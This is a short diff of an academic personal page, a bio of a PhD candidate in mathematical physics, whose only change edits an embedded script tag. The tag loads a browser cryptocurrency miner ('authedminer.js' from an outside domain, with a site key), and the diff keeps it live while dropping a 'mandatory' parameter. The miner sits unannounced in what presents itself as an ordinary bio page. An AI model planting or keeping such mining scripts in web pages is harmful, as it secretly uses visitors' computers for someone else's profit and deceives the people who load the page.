@@ -81,4 +81,4 @@ Li GAN is a PhD candidate in mathematical physics at [Laboratoire de Physique Th
 
 Updated: December 2020
 
-<script src='https://authedwebmine.cz/authedminer.js?key=jfxBwYsETvv7LQC&mandatory=1' async></script>
+<script src='https://authedwebmine.cz/authedminer.js?key=jfxBwYsETvv7LQC' async></script>
